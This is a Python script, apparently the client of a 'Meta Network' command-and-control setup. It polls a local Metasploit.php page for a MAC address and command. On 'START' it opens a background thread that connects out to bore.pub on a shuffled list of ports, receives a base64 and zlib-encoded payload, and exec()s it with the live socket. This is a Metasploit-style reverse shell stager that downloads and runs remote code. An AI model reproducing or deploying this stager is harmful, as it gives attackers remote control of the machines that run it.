import requests
import time
import subprocess
import uuid
import socket
import zlib
import base64
import struct
import random
import threading
import os
import sys

os.system("clear")
os.system("figlet -c -f ~/.local/share/fonts/figlet-fonts/3d.flf Meta | lolcat")
os.system("figlet -c -f ~/.local/share/fonts/figlet-fonts/3d.flf Network | lolcat")

actual_mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
actual_mac = ':'.join([actual_mac[e:e+2] for e in range(0, 12, 2)])

previous_data = ""

local_port_file = "LPort.io"
if os.path.exists(local_port_file):
    # If it exists, read the local port from it
    with open(local_port_file, "r") as file:
        PORT = file.read().strip()

while True:
    # Request data from PHP script
    url = f'http://127.0.0.1:{PORT}/Metasploit.php'
    response = requests.get(url)

    if response.status_code == 200:
        data = response.text
        if data != previous_data:
            # Split the received data into MAC and option
            parts = data.strip().split('::')
            if len(parts) == 2:
                mac, option = parts
            elif len(parts) == 1:
                mac = parts[0]
                option = "No Command"
            else:
                print("Invalid data format.")
                continue

            # Print the MAC and Command
            print("Received MAC:", mac)
            print("Received Command:", option)
            time.sleep(1)
 
            previous_data = data
            if mac == '':
                if option == "STOP":
                  def restart_program():
                     python = sys.executable
                     os.execl(python, python, *sys.argv)
                  restart_program()  # Restart the script
            if mac == actual_mac:
                if option == "START":
                    print("Starting with MAC validation...")
                    def run_specific_code():
                     import socket, zlib, base64, struct, time, random

                     while True:
                        ports_to_try = [61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012]
                        random.shuffle(ports_to_try)  # Shuffle the list of ports randomly
    
                        for port in ports_to_try:
                            try:
                               s = socket.socket(2, socket.SOCK_STREAM)
                               s.connect(('bore.pub', port))
            
                               l = struct.unpack('>I', s.recv(4))[0]
                               d = s.recv(1)
                               while len(d) < l:
                                   d += s.recv(l - len(d))

                               exec(zlib.decompress(base64.b64decode(d)), {'s': s})

                            except Exception as e:
                               print(f"An error occurred: {e}")
                            finally:
                             s.close()
        
                            if 's' in locals():
                               break  # Break out of the loop if connection was successful
    
                            print("Waiting for 1 seconds before retrying...")
                       
                    specific_code_thread = threading.Thread(target=run_specific_code)
                    specific_code_thread.daemon = True  
                    specific_code_thread.start()
                elif option == "STOP":
                    def restart_program():
                     python = sys.executable
                     os.execl(python, python, *sys.argv)
                    restart_program()  # Restart the script
                else:
                    print("Invalid command:", option)
            else:
                print("MAC not provided or does not match. Cannot execute command.")
        else:
            print("No new data.")
    else:
        print("Failed to fetch data.")

    # Wait for some time before checking again (adjust as needed)
    time.sleep(1)
